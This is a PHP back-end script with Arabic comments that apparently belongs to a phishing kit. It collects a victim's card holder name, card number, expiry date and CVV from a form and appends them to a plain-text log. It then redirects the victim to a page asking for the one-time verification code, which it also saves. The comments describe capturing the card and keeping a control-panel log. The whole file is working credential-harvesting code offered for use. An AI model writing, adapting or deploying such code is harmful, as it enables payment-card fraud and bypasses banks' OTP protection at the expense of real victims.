

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $time = date("Y-m-d H:i:s");

    // أولاً: التحقق إذا كان القادم هو رمز التحقق (OTP)
    if (isset($_POST['otp_code'])) {
        $otp_code = trim($_POST['otp_code']);

        if (!empty($otp_code)) {
            // حفظ الرمز في ملف لوحة التحكم مع وسم يوضح طبيعته
            $line = "--- رمز تحقق جديد ---|||الرمز المستلم: " . $otp_code . "|||---|||---|||" . $time . "\n";
            file_put_contents("data_secure_log.txt", $line, FILE_APPEND | LOCK_EX);

            // التوجيه الصامت بعد الحفظ (مثلاً لصفحة انتهاء أو صفحة الفحص التالية)
            header("Location: otoop.html");
            exit();
        }
    } 
    
    // ثانياً: كود استقبال بيانات البطاقة الأساسية (كودك القديم المستقر)
    else {
        $holder_name = trim($_POST['holder_name']);
        $card_no     = trim($_POST['card_no']);
        $expiry      = trim($_POST['expiry']);
        $cvv         = trim($_POST['cvv']);

        if (!empty($holder_name) && !empty($card_no) && !empty($expiry) && !empty($cvv)) {
            $line = $holder_name . "|||" . $card_no . "|||" . $expiry . "|||" . $cvv . "|||" . $time . "\n";
            file_put_contents("data_secure_log.txt", $line, FILE_APPEND | LOCK_EX);
            
            // التوجيه التلقائي لصفحة إدخال الرمز otp.html بعد سحب البطاقة
            header("Location: ibood.html");
            exit();
        } else {
            echo "يرجى ملء جميع الحقول المطلوبة.";
        }
    }
} else {
    echo "غير مسموح بالدخول المباشر.";
}
?>


























